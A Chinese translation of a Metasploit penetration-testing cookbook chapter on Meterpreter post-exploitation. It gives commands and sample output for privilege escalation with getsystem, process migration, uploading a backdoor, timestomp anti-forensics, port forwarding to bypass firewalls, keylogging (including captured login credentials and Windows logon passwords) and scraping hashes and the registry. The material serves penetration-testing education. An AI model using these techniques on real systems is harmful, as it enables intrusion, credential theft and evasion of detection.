# Metasploit 渗透测试秘籍（二）

> 原文：[`annas-archive.org/md5/5103BA072B171774B556C75B597E241F`](https://annas-archive.org/md5/5103BA072B171774B556C75B597E241F)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 第五章：使用 Meterpreter 探索受损目标

在本章中，我们将涵盖以下内容：

+   分析 meterpreter 系统命令

+   特权升级和进程迁移

+   设置与目标的多个通信通道

+   Meterpreter 文件系统命令

+   使用 timestomp 更改文件属性

+   使用 meterpreter 网络命令

+   获取桌面和键盘记录

+   使用 scraper meterpreter 脚本

# 介绍

到目前为止，我们已经更加强调了前利用阶段，在这个阶段中，我们尝试了各种技术和利用来妥协我们的目标。在本章中，我们将更加强调后利用阶段——在我们利用目标机器之后我们可以做什么。Metasploit 提供了一个非常强大的后利用工具，名为 meterpreter，它为我们提供了许多功能，可以简化我们探索目标机器的任务。在前一章的绕过防病毒中，我们已经看到了 meterpreter 和后利用的使用。在本章中，我们将详细了解 meterpreter 以及如何将其用作后利用阶段的潜在工具。

我们一直在使用有效载荷来实现特定的结果，但它们有一个主要的缺点。有效载荷通过在受损系统中创建新进程来工作。这可能会触发防病毒程序的警报，并且很容易被捕获。此外，有效载荷仅限于执行 shell 可以运行的特定任务或执行特定命令。为了克服这些困难，meterpreter 应运而生。

**Meterpreter**是 Metasploit 的命令解释器，充当有效载荷，并通过使用内存 DLL 注入和本机共享对象格式来工作。它与被利用的进程上下文中工作，因此不会创建任何新进程。这使得它更加隐秘和强大。

让我们看一下 meterpreter 的功能。以下图表显示了加载 meterpreter 的简单逐步表示：

![介绍](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-pentest-cb/img/7423_05_01.jpg)

在第一步中，利用和第一阶段的有效载荷被发送到目标机器。在利用之后，分段器将自身绑定到具有特定任务的目标，并尝试连接到攻击的`msfconsole`，并建立适当的通信通道。现在，分段器加载 DLL。`msfconsole`并发送第二阶段 DLL 注入有效载荷。成功注入后，MSF 发送 meterpreter DLL 以建立适当的通信通道。最后，meterpreter 加载扩展，如`stdapi`和`priv`。所有这些扩展都是使用 TLS/1.0 和 TLV 协议加载的。Meterpreter 使用加密通信与目标用户，这是使用它的另一个主要优势。让我们快速总结 meterpreter 相对于特定有效载荷的优势：

+   它与被利用的进程上下文中工作，因此不会创建新进程

+   它可以在进程之间轻松迁移

+   它完全驻留在内存中，因此不会在磁盘上写入任何内容

+   它使用加密通信

+   它使用通道化的通信系统，因此我们可以同时使用多个通道

+   它提供了一个快速而轻松地编写扩展的平台

本章完全致力于使用 meterpreter 提供的各种命令和脚本来探索目标机器。我们将从分析常见的 meterpreter 命令开始。然后，我们将继续设置不同的通信通道，使用网络命令，键盘记录等。最后，我们将讨论 scraper meterpreter 脚本，它可以创建一个包含有关目标用户的各种信息的单个目录。在本章中，我们将主要关注那些可以帮助探索受损系统的命令和脚本。

所以让我们继续深入研究 meterpreter 的方法。

# 分析 meterpreter 系统命令

让我们开始使用 meterpreter 命令来了解它们的功能。由于它是一个后期利用工具，我们将需要一个受损的目标来执行命令。我们将使用一个已经利用了浏览器漏洞的 Windows 7 机器作为目标。您可以参考第四章中的*Internet Explorer CSS 递归调用内存损坏*配方，了解更多详情。

## 准备就绪

在入侵 Windows 7 目标机器后，我们将启动一个 meterpreter 会话，因为我们使用了`windows/meterpreter/bind_tcp`有效载荷。我们将首先使用一个简单的`?`命令，它将列出所有可用的 meterpreter 命令，以及简短的描述：

```
meterpreter > ? 
```

快速浏览整个列表。许多命令都是不言自明的。

## 如何做...

让我们从一些有用的系统命令开始。

+   background：此命令用于将当前会话设置为后台，以便在需要时再次使用。当有多个活动的 meterpreter 会话时，此命令很有用。

+   getuid：此命令返回正在运行的用户名，或者我们已经进入的目标机器上的用户名。

```
meterpreter > getuid
Server username: DARKLORD-PC\DARKLORD 
```

+   getpid：此命令返回我们当前运行 meterpreter 的进程 ID。

```
meterpreter > getpid
Current pid: 4124 
```

+   ps：此命令将列出目标机器上所有正在运行的进程。此命令有助于识别目标上运行的各种服务和软件。

```
meterpreter > ps
PID Name Arch Session User
--- ---- ------- ----
0 [System Process]
1072 svchost.exe
1172 rundll32.exe x86 1 DARKLORD-PC\DARKLORD 
```

+   sysinfo：这是一个方便的命令，可以快速验证系统信息，如操作系统和架构。

```
meterpreter > sysinfo
Computer : DARKLORD-PC
OS : Windows 7 (Build 7264).
Architecture : x86
System Language : en_US
Meterpreter : x86/win32 
```

+   shell：此命令将我们带入一个 shell 提示符。我们已经在一些先前的配方中看到了这个 meterpreter 命令的用法。

```
meterpreter > shell
Process 4208 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7264]
Copyright (c) 2009 Microsoft Corporation. All rights reserved. 
```

+   退出：此命令用于终止 meterpreter 会话。此命令也可用于终止 shell 会话并返回到 meterpreter。

这些是一些有用的系统命令，可用于探索受损目标以获取更多信息。还有许多其他命令，我留给您去尝试和探索。您可能已经注意到，使用 meterpreter 命令并探索目标是多么容易，而如果没有它，这将是一项困难的任务。在我们的下一个配方中，我们将专注于一些高级的 meterpreter 命令。

## 工作原理...

Meterpreter 的工作方式类似于任何命令解释器。它旨在通过命令理解和响应各种参数调用。它驻留在被利用/受损的进程的上下文中，并与渗透测试人员的机器创建客户端/服务器通信系统。

![工作原理...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-pentest-cb/img/7423_05_02.jpg)

前面的图表简要展示了 meterpreter 的功能。一旦建立通信通道，我们就可以向 meterpreter 服务器发送命令调用，以便将其响应发送回我们的机器。随着本章的深入，我们将更详细地了解渗透测试机器与受损目标之间的通信。

# 特权升级和进程迁移

在这个配方中，我们将专注于 meterpreter 的两个非常有用的命令。第一个是**特权升级**。此命令用于提升目标系统上的权限/权限。我们可能以较低权限的用户身份进入系统。因此，我们可以提升我们的特权以成为系统管理员，以便在执行任务时不受干扰。第二个命令是**进程迁移**。此命令用于在不在磁盘上写入任何内容的情况下从一个进程迁移到另一个进程。

## 如何做...

为了提升我们的特权，meterpreter 为我们提供了`getsystem`命令。此命令会自动开始寻找各种可能的技术，通过这些技术，用户的权限可以提升到更高级别。让我们分析`getsystem`命令使用的不同技术：

```
meterpreter > getsystem -h
Usage: getsystem [options]
Attempt to elevate your privilege to that of local system.
OPTIONS:
-t <opt> The technique to use. (Default to '0').
0 : All techniques available
1 : Service - Named Pipe Impersonation (In Memory/Admin)
2 : Service - Named Pipe Impersonation (Dropper/Admin)
3 : Service - Token Duplication (In Memory/Admin)
4 : Exploit - KiTrap0D (In Memory/User) 
```

## 工作原理...

`getsystem`命令尝试在目标上提升特权的三种不同技术。默认值`0`尝试所有列出的技术，除非成功尝试。让我们快速看一下这些提升技术。

**命名管道**是一种机制，使应用程序能够在本地或远程进行进程间通信。创建管道的应用程序称为管道服务器，连接到管道的应用程序称为管道客户端。**模拟**是线程能够在与拥有该线程的进程不同的安全上下文中执行的能力。模拟使服务器线程能够代表客户端执行操作，但在客户端的安全上下文的限制内。当客户端拥有的权限超过服务器时，就会出现问题。这种情况将创建一个称为**命名管道模拟**提升攻击的特权提升攻击。

### 注意

有关命名管道模拟的详细文章可以在[`hackingalert.blogspot.com/2011/12/namedpipe-impersonation-attacks.html`](http://hackingalert.blogspot.com/2011/12/namedpipe-impersonation-attacks.html)找到。

操作系统的每个用户都有一个唯一的令牌 ID。该 ID 用于检查系统中各个用户的权限级别。令牌复制是通过低特权用户复制高特权用户的令牌 ID 来实现的。然后，低特权用户会以与高特权用户类似的方式行事，并且具有与高特权用户相同的所有权利和权限。

KiTrapOD 漏洞于 2010 年初发布，影响了微软此前制作的几乎所有操作系统。在 32 位 x86 平台上启用对 16 位应用程序的访问时，它没有正确验证某些 BIOS 调用。这允许本地用户通过构造**线程环境块（TEB）**中的`VDM_TIB`数据结构，来利用`#GP`陷阱处理程序（nt!KiTrap0D），也就是“Windows 内核异常处理程序漏洞”，来获取特权。

现在我们已经了解了`getsystem`命令使用的各种提升技术，我们的下一步将是在目标上执行该命令，看看会发生什么。首先，我们将使用`getuid`命令来检查我们当前的用户 ID，然后我们将尝试使用`getsystem`命令来提升我们的特权：

```
meterpreter > getuid
Server username: DARKLORD-PC\DARKLORD
meterpreter > getsystem
...got system (via technique 1).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM 
```

正如您所看到的，以前我们是一个特权较低的用户，使用`getsystem`命令后，我们将特权提升为系统用户。

我们将讨论的下一个重要的 meterpreter 命令是`migrate`命令。该命令用于从一个进程上下文迁移到另一个进程上下文。在当前进程可能崩溃的情况下，该命令非常有用。例如，如果我们使用浏览器漏洞渗透系统，那么在利用后浏览器可能会挂起，用户可能会关闭它。因此，迁移到稳定的系统进程可以帮助我们顺利进行渗透测试。我们可以使用进程 ID 迁移到任何其他活动进程。`ps`命令可用于标识所有活动进程的 ID。例如，如果`explorer.exe`的 ID 是`2084`，那么我们可以通过执行以下命令迁移到`explorer.exe`：

```
meterpreter > migrate 2084
[*] Migrating to 2084...
[*] Migration completed successfully. 
```

这两个 meterpreter 命令非常方便，并且在渗透测试期间经常使用。它们的简单性和高生产力使它们非常适合使用。在我们的下一个示例中，我们将处理通信渠道以及如何有效地使用它们与目标进行通信。

# 与目标建立多个通信渠道

在这个教程中，我们将看看如何为与目标通信建立多个频道。我们在本章的介绍中讨论了 meterpreter 中客户端和服务器之间的通信是加密的，并且它使用**类型-长度-值（TLV）**协议进行数据传输。使用 TLV 的主要优势在于它允许将数据与特定的频道号标记，从而允许受害者上运行的多个程序与攻击机上的 meterpreter 进行通信。这有助于同时建立多个通信频道。

让我们现在分析如何使用 meterpreter 与目标机器建立多个通信频道。

## 准备工作

Meterpreter 提供了一个名为`execute`的特定命令，可以用于启动多个通信频道。首先，让我们运行`execute -h`命令，查看可用选项：

```
meterpreter > execute -h
Usage: execute -f file [options]
Executes a command on the remote machine.
OPTIONS:
-H Create the process hidden from view.
-a <opt> The arguments to pass to the command.
-c Channelized I/O (required for interaction).
-d <opt> The 'dummy' executable to launch when using -m.
-f <opt> The executable command to run.
-h Help menu.
-i Interact with the process after creating it.
-k Execute process on the meterpreters current desktop
-m Execute from memory.
-s <opt> Execute process in a given session as the session user
-t Execute process with currently impersonated thread token 
```

您可以看到`execute`命令提供给我们的各种参数。让我们使用其中一些参数来设置多个频道。

## 如何做...

要开始创建频道，我们将使用`execute`命令的`-f`运算符：

```
meterpreter > execute -f notepad.exe -c
Process 5708 created.
Channel 1 created. 
```

注意不同参数的使用。`-f`参数用于设置可执行命令，`-c`运算符用于设置通道化 I/O。现在我们可以再次运行 execute 命令，启动另一个频道，而不终止当前频道：

```
meterpreter > execute -f cmd.exe -c
Process 4472 created.
Channel 2 created.
meterpreter > execute -f calc.exe -c
Process 6000 created.
Channel 3 created. 
```

现在我们在受害者机器上同时运行了三个不同的频道。要列出可用的频道，我们可以使用`channel -l`命令。如果我们想要发送一些数据或在频道上写入一些内容，我们可以使用`write`命令，后面跟着我们想要写入的频道 ID。让我们继续在我们的一个活动频道中写入一条消息：

```
meterpreter > write 5
Enter data followed by a '.' on an empty line:
Metasploit!!
.
[*] Wrote 13 bytes to channel 5. 
```

执行`write`命令以及频道 ID，提示我们输入数据，然后输入一个句号。我们成功地在频道上写入了`Metasploit!!`。为了读取任何频道的数据，我们可以使用`read`命令，后面跟着频道 ID。

此外，如果我们想要与任何频道交互，我们可以使用`interact`命令，后面跟着频道 ID：

```
meterpreter > interact 2
Interacting with channel 2...
Microsoft Windows [Version 6.1.7264]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.
C:\Users\DARKLORD\Desktop> 
```

您可以看到我们的频道 2 是一个命令提示符频道，因此通过使用`interact`命令，我们直接进入了命令提示符模式，从那里我们可以执行系统命令。我们可以通过使用`interact`命令轻松地在频道之间切换。为了结束一个频道，我们可以使用`close`命令，后面跟着频道 ID。

这个教程演示了使用多个频道的强大功能。它还展示了同时管理它们和在不同频道之间切换有多么容易。当我们在目标机器上运行多个服务时，使用频道变得很重要。

在下一个教程中，我们将专注于使用 meterpreter 探索目标机器的文件系统。

## 它是如何工作的...

Metasploit 使用单独的频道 ID 为每条消息打上标签，这有助于识别应在其中执行特定命令的频道上下文。正如前面所述，meterpreter 中的通信过程遵循 TLV 协议，这使得可以使用特定的频道 ID 为不同的消息打上标签，以提供多频道通信支持的灵活性。

# Meterpreter 文件系统命令

在这个教程中，我们将继续使用文件系统命令。这些命令可以帮助我们探索目标系统，执行各种任务，比如搜索文件、下载文件和更改目录。您会注意到使用 meterpreter 轻松控制目标机器有多么容易。让我们开始使用一些有用的文件系统命令。

## 如何做...

我们将从简单的`pwd`命令开始，该命令列出了我们在目标机器上的当前工作目录。同样，我们可以使用`cd`命令将我们的工作目录更改为我们喜欢的位置：

```
meterpreter > pwd
C:\Users\DARKLORD\Desktop
meterpreter > cd c:\
meterpreter > pwd
c:\ 
```

正如您所看到的，我们首先使用`pwd`命令列出了我们的工作目录，然后使用`cd`命令将我们的工作目录更改为“c：”。我们还可以使用`ls`命令列出当前目录中可用的文件。

既然我们可以使用目录，我们的下一个任务将是在驱动器上搜索文件。浏览每个目录和子目录以寻找文件将非常乏味。我们可以使用`search`命令快速搜索特定文件类型。考虑以下示例：

```
meterpreter > search -f *.doc -d c:\ 
```

该命令将搜索`C`驱动器中具有`.doc`作为文件扩展名的所有文件。使用`f`参数指定要搜索的文件模式，`d`参数告诉要搜索哪个文件的目录。

所以一旦我们搜索到我们特定的文件，我们可以做的下一件事是将文件下载到目标机器上。让我们首先尝试将文件下载到我们的攻击系统：

```
meterpreter > download d:\secret.doc /root
[*] downloading: d:secret.doc -> /root/d:secret.doc
[*] downloaded : d:secret.doc -> /root/d:secret.doc 
```

通过使用`download`命令，我们可以成功地从目标机器下载任何文件到我们的机器。 “d：\secret.doc”文件在我们的攻击机器的`root`文件夹中下载。

同样，我们可以使用`upload`命令将任何文件发送到目标机器：

```
meterpreter > upload /root/backdoor.exe d:\
[*] uploading : /root/backdoor.exe -> d:\
[*] uploaded : /root/backdoor.exe -> d:\\backdoor.exe 
```

最后，我们可以使用`del`命令从目标机器中删除文件或目录。

```
meterpreter > del d:\backdoor.exe 
```

## 它是如何工作的...

Meterpreter 通过设置交互式命令提示符为我们提供对目标机器的完全访问。我们还可以放置一个 shell 会话以在默认的 Windows DOS 模式下工作，但它不会有太多功能。这是对 meterpreter 的一些重要文件系统命令的快速参考，可以帮助我们探索目标机器上的文件。还有更多的命令；建议您应该尝试它们，并找出可能存在的各种可能性。

在下一个步骤中，我们将看到一个非常有趣的 meterpreter 命令，称为`timestomp`，它可以用于修改目标机器上的文件属性。

# 使用 timestomp 更改文件属性

在上一个步骤中，我们了解了一些重要且有用的 meterpreter 文件系统命令，可用于在目标机器上执行各种任务。 Meterpreter 还包含另一个有趣的命令，称为`timestomp`。此命令用于更改文件的**修改-访问-创建-输入（MACE）**属性。属性值是文件发生任何 MACE 活动的日期和时间。使用`timestomp`命令，我们可以更改这些值。

## 准备就绪

在开始配方之前，可能会有一个问题在你的脑海中出现。为什么要更改 MACE 值？黑客通常使用更改 MACE 值的技术，以使目标用户感到文件已经存在系统很长时间，并且没有被触摸或修改。在可疑活动的情况下，管理员可能会检查最近修改的文件，以查找是否已修改或访问任何文件。因此，使用此技术，文件将不会出现在最近访问或修改项目的列表中。即使还有其他技术可以找出文件属性是否已被修改，这种技术仍然很有用。

让我们从目标机器中挑选一个文件并更改其 MACE 属性。以下屏幕截图显示了在使用“timestomp”之前文件的各种 MACE 值：

![准备就绪](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-pentest-cb/img/7423_05_03.jpg)

现在我们将继续前进，更改各种 MACE 值。让我们从常见的`timestomp -h`命令开始，该命令用于列出各种可用选项。我们可以使用`-v`运算符列出 MACE 属性的值：

```
meterpreter > timestomp d:\secret.doc v
Modified : 2011-12-12 16:37:48 +0530
Accessed : 2011-12-12 16:37:48 +0530
Created : 2011-12-12 16:37:47 +0530
Entry Modified: 2011-12-12 16:47:56 +0530 
```

## 如何做...

我们将从更改文件的创建时间开始。注意使用`timestomp`命令传递的各种参数：

```
meterpreter > timestomp d:\secret.doc -c "3/13/2013 13:13:13"
[*] Setting specific MACE attributes on d:secret.doc 
```

## 它是如何工作的...

`-c`运算符用于更改文件的创建时间。同样，我们可以使用`-m`和`-a`运算符来更改文件的修改和最后访问属性：

```
meterpreter > timestomp d:\secret.doc -m "3/13/2013 13:13:23"
[*] Setting specific MACE attributes on d:secret.doc
meterpreter > timestomp d:\secret.doc -a "3/13/2013 13:13:33"
[*] Setting specific MACE attributes on d:secret.doc 
```

属性更改后，我们可以再次使用`-v`运算符来检查和验证我们是否成功执行了命令。让我们继续检查文件属性：

```
meterpreter > timestomp d:\secret.doc v
Modified : 2013-03-13 13:13:13 +0530
Accessed : 2013-03-13 13:13:23 +0530
Created : 2013-03-13 13:13:33 +0530
Entry Modified: 2013-03-13 13:13:13 +0530 
```

太棒了！我们已成功修改了文件的 MACE 属性。现在这个文件可以很容易地从最近修改或最近访问文件的列表中隐藏起来。

或者，我们也可以使用`-z`运算符一次性更改所有四个 MACE 值。我们不必为每个值单独传递命令。但是`-z`运算符会将相同的值分配给所有四个 MACE 属性，这在实际上是不可能的。创建和访问时间之间必须有一些时间差。因此，应避免使用`-z`运算符。

这是一个处理`timestomp`实用程序的小技巧。在下一个技巧中，我们将看一些有用的 Meterpreter 网络命令，当我们了解枢纽转移时，这些命令将对我们非常有用。

# 使用 meterpreter 网络命令

Meterpreter 还为我们提供了一些有用的网络命令。这些命令对于了解目标用户的网络结构很有用。我们可以分析系统是属于局域网还是独立系统。我们还可以了解 IP 范围、DNS 和其他信息。在进行枢纽转移时，这些网络信息可能很有用。枢纽转移是一个概念，通过它我们可以攻击与我们的目标位于同一网络中的其他计算机。我们将在下一章中了解枢纽转移，重点是 Meterpreter 的高级用法。

## 做好准备

在我们进入这个技巧之前，有三个网络术语我们将在这里遇到。因此，让我们通过查看以下术语来快速回顾一下我们的记忆：

+   **子网**是将一个大网络划分为更小可识别部分的概念。子网划分是为了增加地址的实用性和安全性。

+   **子网掩码**是一个 32 位的掩码，用于将 IP 地址划分为子网并指定网络的可用主机。

+   **网关**指定了转发或下一跳 IP 地址，通过它可以到达由网络目的地和子网掩码定义的地址集。

当我们处理`route`命令时，我们将使用这三个术语。

## 如何做到...

Meterpreter 提供了三个网络命令。它们是`ipconfig`、`route`和`portfwd`。让我们快速看一下它们各自的功能。

`Ipconfig`命令用于显示目标机器的所有 TCP/IP 网络配置。它列出了目标 IP 地址、硬件 MAC 和子网掩码等信息：

```
meterpreter > ipconfig
Reliance
Hardware MAC: 00:00:00:00:00:00
IP Address : 115.242.228.85
Netmask : 255.255.255.255
Software Loopback Interface 1
Hardware MAC: 00:00:00:00:00:00
IP Address : 127.0.0.1
Netmask : 255.0.0.0 
```

正如你所看到的，`ipconfig`的输出列出了各种活动的 TCP/IP 配置。

下一个网络命令是`route`命令。它类似于 MS DOS 的`route`命令。该命令用于显示或修改目标机器上的本地 IP 路由表。执行`route`命令会列出当前的表格：

```
meterpreter > route
Network routes
==============
Subnet Netmask Gateway
------ ------- -------
0.0.0.0 0.0.0.0 115.242.228.85
115.242.228.85 255.255.255.255 115.242.228.85
127.0.0.0 255.0.0.0 127.0.0.1
127.0.0.1 255.255.255.255 127.0.0.1
127.255.255.255 255.255.255.255 127.0.0.1
192.168.56.0 255.255.255.0 192.168.56.1
192.168.56.1 255.255.255.255 192.168.56.1
192.168.56.255 255.255.255.255 192.168.56.1
224.0.0.0 240.0.0.0 127.0.0.1
224.0.0.0 240.0.0.0 192.168.56.1
224.0.0.0 240.0.0.0 115.242.228.85
255.255.255.255 255.255.255.255 127.0.0.1
255.255.255.255 255.255.255.255 192.168.56.1
255.255.255.255 255.255.255.255 115.242.228.85 
```

让我们执行`route -h`命令，看看我们如何修改表格。

```
meterpreter > route -h
Usage: route [-h] command [args]
Supported commands:
add [subnet] [netmask] [gateway]
delete [subnet] [netmask] [gateway] 
```

如果你看一下`ipconfig`命令的输出，你会发现 IP 地址`115.242.228.85`是目标用来连接互联网的。因此，我们可以添加一个路由值，通过`115.242.228.85`作为网关传递连接。这可以为我们提供目标机器上的防火墙绕过：

```
meterpreter > route add 192.168.56.2 255.255.255.255 192.168.56.1
Creating route 192.168.56.2/255.255.255.255 -> 192.168.56.1 
```

同样，我们可以使用`delete`命令从表中删除路由。

让我们转到最后一个网络命令——`portfwd`。这个命令用于将传入的 TCP 和/或 UDP 连接转发到远程主机。考虑以下示例以了解端口转发。

考虑主机“A”、主机“B”（中间）和主机“C”。主机 A 应该连接到主机 C 以执行某些操作，但如果由于任何原因不可能，主机 B 可以直接连接到 C。如果我们在中间使用主机 B，从 A 获取连接流并将其传递到 B，同时处理连接，我们称主机 B 正在进行**端口转发**。

这就是数据包在传输中的样子：主机 B 正在运行一个软件，该软件在其端口之一上打开 TCP 监听器，比如端口 20。主机 C 也在运行一个监听器，用于在从端口 20 到达时连接到主机 B。因此，如果 A 在 B 的 20 号端口上发送任何数据包，它将自动转发到主机 C。因此，主机 B 正在将其数据包端口转发到主机 C。

## 它是如何工作的...

要与远程主机开始端口转发，我们可以首先添加一个转发规则。考虑以下命令行：

```
Meterpreter> portfwd -a -L 127.0.0.1 -l 444 -h 69.54.34.38 -p 3389 
```

注意不同的命令参数。使用`-a`参数，我们可以添加一个新的端口转发规则。`-L`参数定义要将转发套接字绑定到的 IP 地址。由于我们都在主机 A 上运行这些命令，并且希望从同一主机继续工作，我们将 IP 地址设置为`127.0.0.1`。

`-l`是主机 A 上将打开的端口号，用于接受传入连接。`-h`定义了主机 C 的 IP 地址，或者内部网络中的任何其他主机。`-p`是您要连接到的主机 C 上的端口。

这是使用端口转发的简单演示。这种技术被积极用于绕过防火墙和入侵检测系统。

# 获取桌面和按键嗅探

在这个示例中，我们将处理与桌面和按键嗅探相关的一些`stdapi`用户界面命令。捕获按键取决于当前活动的桌面，因此了解我们如何通过切换到不同桌面活动会话中运行的进程来嗅探不同的按键是至关重要的。让我们继续深入了解这个示例。

## 如何做...

让我们开始执行一些用户界面命令，这些命令是我们在这个示例中将主要处理的。它们如下：

+   `enumdesktops:`此命令将列出所有可访问的桌面和窗口站点。

```
meterpreter > enumdesktops
Enumerating all accessible desktops
Desktops
========
Session Station Name
------- ------- ----
0 WinSta0 Default
0 WinSta0 Disconnect
0 WinSta0 Winlogon
0 SAWinSta SADesktop 
```

在这里，您可以看到所有可用的桌面站点都与会话 0 相关联。我们将很快看到我们所说的会话 0 的确切含义。

+   `getdesktop:`此命令返回我们的 meterpreter 会话正在工作的当前桌面。

```
meterpreter > getdesktop
Session 0\Service-0x0-3e7$\Default 
```

您可以将`getdesktop`命令的输出与`enumdesktops`相关联，以了解我们正在工作的当前桌面站点的情况。

+   `setdesktop:`此命令用于将当前的 meterpreter 桌面更改为另一个可用的桌面站点。

+   `keyscan_start:`此命令用于在当前活动的桌面站点中启动按键嗅探器。

+   `keyscan_dump:`此命令会转储活动 meterpreter 桌面会话的记录按键。

现在让我们分析这些命令在实时场景中的工作方式，以及我们如何通过不同的桌面站点嗅探按键。

## 它是如何工作的...

在我们继续进行示例之前，有一个关于 Windows 桌面的重要概念需要我们了解。

Windows 桌面被划分为不同的**会话**，以定义我们与 Windows 机器交互的方式。会话 0 代表控制台。其他会话——会话 1、会话 2 等代表远程桌面会话。

因此，为了捕获我们侵入的系统的按键，我们必须在桌面会话 0 中工作：

![它是如何工作的...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-pentest-cb/img/7423_05_04.jpg)

每个 Windows 桌面会话包括不同的站。在前面的图中，您可以看到与 Session 0 相关的不同站。在这些站中，WinSta0 是唯一的交互式站。这意味着用户只能与 WinSta0 站互动。所有其他站都是非交互式的。现在 WinSta0 包括三个不同的桌面，即 Default、Disconnect 和 Winlogon。默认桌面与我们在桌面上执行的所有应用程序和任务相关联。`Disconnect`桌面与屏幕保护程序锁定桌面有关。Winlogon 桌面与 Windows 登录屏幕有关。

这里需要注意的一点是每个桌面都有自己的键盘缓冲区。因此，如果您必须从`Default`桌面中嗅探按键记录，您必须确保您当前的 meterpreter 活动浏览器设置为`Session 0/WinSta0/Default`。如果您必须嗅探登录密码，那么您将不得不将活动桌面更改为`Session 0/WinSta0/Winlogon`。让我们举个例子来让它更清楚。

让我们使用`getdesktop`命令检查我们当前的桌面：

```
meterpreter > getdesktop
Session 0\Service-0x0-3e7$\Default 
```

正如您所看到的，我们不在`WinSta0`站，这是唯一的交互式桌面站。因此，如果我们在这里运行按键捕获，它不会返回任何结果。让我们将我们的桌面更改为`WinSta0\Default`：

```
meterpreter > setdesktop
Changed to desktop WinSta0\Default
meterpreter > getdesktop
Session 0\WinSta0\Default 
```

前面的命令行显示我们使用`setdesktop`命令切换到了交互式 Windows 桌面站。因此，现在我们已经准备好运行按键记录嗅探器来捕获用户在目标机器上按下的按键：

```
meterpreter > keyscan_start
Starting the keystroke sniffer...
meterpreter > keyscan_dump
Dumping captured keystrokes...
gmail.com <Return> daklord <Tab> 123123 
```

查看转储的按键记录，您可以清楚地识别出目标用户访问了[gmail.com](http://gmail.com)并输入了他的凭据进行登录。

如果您想嗅探 Windows 登录密码怎么办？显然，您可以使用`setdesktop`命令将您的活动桌面切换到`WinSta0\Winlogon`，但在这里我们也将讨论另一种方法。我们可以迁移到在 Windows 登录期间运行的进程。让我们执行`ps`命令来检查正在运行的进程。

您会发现`winlogon.exe`作为一个带有进程 ID 的进程在运行。让我们假设`winlogon.exe`的**进程 ID（PID）**为`1180`。现在让我们迁移到这个 PID 并再次检查我们的活动桌面：

```
meterpreter > migrate 1180
[*] Migrating to 1180...
[*] Migration completed successfully.
meterpreter > getdesktop
Session 0\WinSta0\Winlogon 
```

您可以看到我们的活动桌面已更改为`WinSta0\Winlogon`。现在我们可以运行`keyscan_start`命令来开始嗅探 Windows 登录屏幕上的按键记录。

同样，我们可以通过迁移到运行在默认桌面上的任何进程来返回到默认桌面。考虑使用 PID `884`的`explorer.exe`：

```
meterpreter > migrate 884
[*] Migrating to 884...
[*] Migration completed successfully.
meterpreter > getdesktop
Session 0\WinSta0\Default 
```

您可能已经注意到了迁移到不同进程和桌面环境以嗅探按键记录的重要性。通常，人们在直接运行`keyscan`而不查看当前活动桌面时得不到任何结果。这是因为他们渗透的进程可能属于不同的会话或站。因此，在使用按键记录嗅探时，请牢记桌面的概念。

# 使用刮削器 meterpreter 脚本

到目前为止，我们已经了解了几个 meterpreter 命令。在这里，我们将看一下一个重要的 meterpreter 脚本，它可以帮助我们更深入地探索目标。下一章将广泛涵盖 meterpreter 脚本，因此在这里我们将专注于使用脚本。在渗透测试期间，您可能需要大量时间来挖掘目标的信息。因此，对于渗透测试人员来说，拥有有用信息的本地备份可以真正方便，即使目标已经关闭，他们仍然有信息可以使用。它还使与其他测试人员共享信息变得容易。刮削器为我们完成了这项任务。

## 准备工作

使用刮削器 meterpreter 脚本可以挖掘有关受损目标的大量信息，例如注册表信息、密码哈希和网络信息，并将其存储在测试人员的本地机器上。

为了在目标上使用 meterpreter 执行 Ruby 脚本，我们可以使用`run`命令。执行`run scraper -h`命令将列出我们可以与脚本一起传递的各种可用参数。让我们继续分析如何可以在本地下载信息。

## 如何做到这一点...

脚本在执行后会自动完成所有操作。它在`/root/.msf4/logs/scripts/scraper`下创建一个目录，其中保存了所有文件。您可能会在脚本执行过程中注意到错误，这可能是因为某个命令在目标上执行失败（命令行输出已经被缩短以适应）：

```
meterpreter > run scraper
[*] New session on 192.168.56.1:4232...
[*] Gathering basic system information...
[*] Error dumping hashes: Rex::Post::Meterpreter::RequestError priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
[*] Obtaining the entire registry...
[*] Exporting HKCU
[*] Downloading HKCU (C:\Users\DARKLORD\AppData\Local\Temp\UKWKdpIb.reg) 
```

脚本会自动下载并保存信息到目标文件夹。让我们看一下源代码，分析是否可以根据我们的需求进行一些更改。

## 它是如何工作的...

`scraper.rb`的源代码位于`/pentest/exploits/framework3/scripts/meterpreter`下。

Ruby 编程经验可以帮助您编辑脚本以添加您自己的功能。我们可以通过编辑以下行来更改下载位置：

```
logs = ::File.join(Msf::Config.log_directory, 'scripts','scraper', host + "_" + Time.now.strftime("%Y%m%d.%M%S")+sprintf("%.5d",rand(100000)) ) 
```

假设您还想获取可用进程列表的结果，那么您可以简单地在程序的主体中添加以下代码行：

```
::File.open(File.join(logs, "process.txt"), "w") do |fd|
fd.puts(m_exec(client, "tasklist"))
end 
```

通过使用一点点 Ruby 语言和代码重用，您可以轻松修改代码以适应您的需求。

## 还有更多...

让我们了解另一个可以用于从目标机器收集信息的 meterpreter 脚本。

### 使用 winenum.rb

`winenum.rb`是另一个 meterpreter 脚本，可以帮助您收集有关目标的信息并在本地下载。它的工作方式类似于`scraper.rb`。您也可以尝试使用这个脚本，看看它可以提供什么额外的信息。该脚本可以在以下位置找到：

`/pentest/exploits/framework3/scripts/meterpreter/winenum.rb`


# 第六章：高级 Meterpreter 脚本

在这一章中，我们将涵盖：

+   传递哈希

+   设置持久连接与后门

+   使用 meterpreter 进行枢纽

+   使用 meterpreter 进行端口转发

+   Meterpreter API 和 mixin

+   Railgun-将 Ruby 转换为武器

+   将 DLL 和函数定义添加到 Railgun

+   构建“Windows 防火墙停用器”meterpreter 脚本

+   分析现有的 meterpreter 脚本

# 介绍

